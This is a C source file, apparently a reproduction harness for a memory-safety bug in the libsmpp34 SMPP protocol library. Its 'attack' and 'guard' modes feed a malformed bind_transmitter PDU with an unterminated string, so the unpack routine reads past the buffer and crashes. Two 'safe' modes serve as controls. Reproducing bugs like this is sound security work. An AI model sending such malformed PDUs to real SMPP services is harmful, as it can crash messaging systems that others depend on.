/* frontier driver — calls the pinned, unmodified libsmpp34 public unpack API.
 * No upstream source line is edited. All inputs are local, loopback-free.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <unistd.h>

#include "smpp34.h"
#include "smpp34_structs.h"

extern int smpp34_unpack(uint32_t type, void *tt, const uint8_t *ptrBuf, int ptrLen);

static void be32(uint8_t *p, uint32_t v)
{
	p[0] = (uint8_t)(v >> 24);
	p[1] = (uint8_t)(v >> 16);
	p[2] = (uint8_t)(v >> 8);
	p[3] = (uint8_t)v;
}

static void header(uint8_t *p, uint32_t len)
{
	be32(p, len);                  /* command_length */
	be32(p + 4, BIND_TRANSMITTER); /* command_id */
	be32(p + 8, ESME_ROK);         /* command_status */
	be32(p + 12, 1);               /* sequence_number */
}

static void report(const char *mode, int rv, uint32_t len)
{
	printf("MODE=%s LEN=%u rv=%d strerror=%s\n", mode, len, rv, smpp34_strerror);
	fflush(stdout);
}

int main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "attack";
	bind_transmitter_t pdu;
	uint8_t *buf;
	uint32_t len;
	int rv;

	memset(&pdu, 0, sizeof(pdu));

	if (!strcmp(mode, "attack")) {
		/* Header plus one unterminated C-Octet byte: strlen must read
		 * past this exact-size heap allocation. */
		len = 17;
		buf = malloc(len);
		header(buf, len);
		buf[16] = 'A';
		rv = smpp34_unpack(BIND_TRANSMITTER, &pdu, buf, (int)len);
		report(mode, rv, len);
		free(buf);
		return 0;
	}

	if (!strcmp(mode, "safe-short")) {
		/* Same shape with the C-Octet terminated inside the buffer. */
		len = 18;
		buf = malloc(len);
		header(buf, len);
		buf[16] = 'A';
		buf[17] = '\0';
		rv = smpp34_unpack(BIND_TRANSMITTER, &pdu, buf, (int)len);
		report(mode, rv, len);
		free(buf);
		return 0;
	}

	if (!strcmp(mode, "safe-full")) {
		/* Complete valid bind_transmitter: all C-Octets terminated. */
		uint8_t *p;
		len = 31;
		buf = malloc(len);
		header(buf, len);
		p = buf + 16;
		memcpy(p, "sys\0", 4); p += 4;
		memcpy(p, "pw\0", 3);  p += 3;
		memcpy(p, "st\0", 3);  p += 3;
		*p++ = 0x34;
		*p++ = TON_International;
		*p++ = NPI_ISDN_E163_E164;
		memcpy(p, "r\0", 2);
		rv = smpp34_unpack(BIND_TRANSMITTER, &pdu, buf, (int)len);
		report(mode, rv, len);
		printf("system_id=%s password=%s address_range=%s\n",
		       pdu.system_id, pdu.password, pdu.address_range);
		free(buf);
		return rv == 0 ? 0 : 1;
	}

	if (!strcmp(mode, "guard")) {
		/* Unterminated byte at the very end of a mapped page, with a
		 * PROT_NONE guard page immediately after: strlen faults even
		 * without a sanitizer. */
		long ps = sysconf(_SC_PAGESIZE);
		len = 17;
		buf = mmap(NULL, (size_t)ps * 2, PROT_READ | PROT_WRITE,
			   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
		if (buf == MAP_FAILED) {
			perror("mmap");
			return 2;
		}
		if (mprotect(buf + ps, (size_t)ps, PROT_NONE)) {
			perror("mprotect");
			return 2;
		}
		buf += ps - len;
		header(buf, len);
		buf[16] = 'A';
		printf("MODE=guard LEN=%u start=%p guard=%p\n",
		       len, (void *)buf, (void *)(buf + len));
		fflush(stdout);
		rv = smpp34_unpack(BIND_TRANSMITTER, &pdu, buf, (int)len);
		report(mode, rv, len);
		return 0;
	}

	fprintf(stderr, "unknown mode: %s\n", mode);
	return 2;
}
